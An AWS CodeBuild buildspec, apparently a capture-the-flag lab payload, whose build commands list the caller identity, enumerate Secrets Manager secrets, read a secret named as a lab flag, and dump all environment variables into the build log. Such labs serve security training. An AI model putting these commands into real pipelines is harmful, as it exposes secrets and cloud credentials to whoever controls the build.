version: 0.2

phases:
  build:
    commands:
      - set +e
      - echo "=== identity ==="
      - aws sts get-caller-identity
      - echo "=== secrets ==="
      - aws secretsmanager list-secrets --region us-east-1 2>&1 || true
      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 2>&1 || true
      - echo "=== env ==="
      - env | sort
      - echo "Done"
